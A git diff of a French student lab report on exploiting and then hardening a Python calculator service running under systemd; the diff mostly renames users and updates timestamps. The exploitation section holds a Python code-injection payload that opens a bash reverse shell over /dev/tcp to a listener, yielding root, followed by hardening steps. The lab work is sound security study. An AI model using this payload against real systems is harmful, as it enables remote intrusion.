@@ -35,7 +35,7 @@ sudo systemctl daemon-reload
 
 - exécutez un simple `systemctl status calculatrice`
 ```ps
-[dums@vbox ~]$ systemctl status calculatrice
+[cauchemar@vbox ~]$ systemctl status calculatrice
 ● calculatrice.service - Super serveur calculatrice
      Loaded: loaded (/etc/systemd/system/calculatrice.service; enabled; preset: disabled)
      Active: active (running) since Wed 2025-02-19 22:30:50 CET; 1min 23s ago
@@ -46,22 +46,22 @@ sudo systemctl daemon-reload
      CGroup: /system.slice/calculatrice.service
              └─1359 /usr/bin/python3 /opt/calc.py
 
-Feb 19 22:30:50 vbox systemd[1]: Started Super serveur calculatrice.
+Feb 23 15:36:20 vbox systemd[1]: Started Super serveur calculatrice.
 ```
 
 🌞 **Vous devez pouvoir utiliser l'application normalement :**
 
 - on peut se connecter depuis notre PC
 ```ps
-PS C:\Users\cleme> ncat 10.1.1.11 13337
+PS C:\Users\cauchemar> ncat 10.1.1.11 13337
 hello
-Hello3+3
-6
+Hello3+4
+7
 ```
 - l'affichage de l'application est disponible dans les logs : 
 ```ps
 journalctl -xe -u calculatrice
-Feb 19 22:30:50 vbox systemd[1]: Started Super serveur calculatrice.
+Feb 23 15:39:26 vbox systemd[1]: Started Super serveur calculatrice.
    Subject: A start job for unit calculatrice.service has finished successfully
    Defined-By: systemd
    Support: https://wiki.rockylinux.org/rocky/support  
@@ -80,13 +80,13 @@ Feb 19 22:30:50 vbox systemd[1]: Started Super serveur calculatrice.
 J'ai utilisé un reverse shell vers le port 4444 de ma machine perso.
 Voila ce que j'écris dans l'application : 
 ```ps
-PS C:\Users\cleme> ncat 10.1.1.11 13337
+PS C:\Users\cauchemar> ncat 10.1.1.11 13337
 hello
 Hello__import__('os').system('bash -c "bash -i >& /dev/tcp/10.1.1.0/4444 0>&1"')
 ```
 Dans mon reverse shell : 
 ```ps
-PS C:\Users\cleme> ncat -lvnp 4444
+PS C:\Users\cauchemar> ncat -lvnp 4444
 Ncat: Version 7.95 ( https://nmap.org/ncat )
 Ncat: Listening on [::]:4444
 Ncat: Listening on 0.0.0.0:4444
@@ -99,7 +99,7 @@ root
 [root@vbox /]# shutdown now
 shutdown now
 [root@vbox /]#
-PS C:\Users\cleme>
+PS C:\Users\cauchemar>
 ```
 
 ## 4. Harden
@@ -109,11 +109,11 @@ PS C:\Users\cleme>
 🌞 **Prouvez que le service s'exécute actuellement en `root`**
 
 ```ps 
-[dums@vbox ~]$ ps aux | grep calc.py
+[cauchemar@vbox ~]$ ps aux | grep calc.py
 root         680  0.0  0.4  10892  8576 ?        Ss   23:30   0:00 /usr/bin/python3 /opt/calc.py
 ```
 ```ps
-[dums@vbox ~]$ ps aux | grep calculatrice
+[cauchemar@vbox ~]$ ps aux | grep calculatrice
 dums        1302  0.0  0.1   6408  2304 pts/0    S+   23:36   0:00 grep --color=auto calculatrice
 ```
 
@@ -138,9 +138,9 @@ sudo chmod 700 /opt/calc.py
 🌞 **Prouvez que le service s'exécute désormais en tant que `calculatrice`**
 
 ```ps
-[dums@vbox ~]$ ps aux | grep calc.py
+[cauchemar@vbox ~]$ ps aux | grep calc.py
 calcula+    1353  0.7  0.4  10828  8192 ?        Ss   23:43   0:00 /usr/bin/python3 /opt/calc.py
-dums        1355  0.0  0.1   6412  2304 pts/0    S+   23:43   0:00 grep --color=auto calc.py
+cauchemar        1355  0.0  0.1   6412  2304 pts/0    S+   23:43   0:00 grep --color=auto calc.py
 ```
 
 ### B. Syscalls
@@ -170,7 +170,7 @@ switch
 - vérifiez que l'exploitation est devenue plus compliquée
 
 ```ps
-[dums@vbox ~]$ sudo cat /etc/systemd/system/calculatrice.service
+[cauchemar@vbox ~]$ sudo cat /etc/systemd/system/calculatrice.service
 [Unit]
 Description=Super serveur calculatrice
 
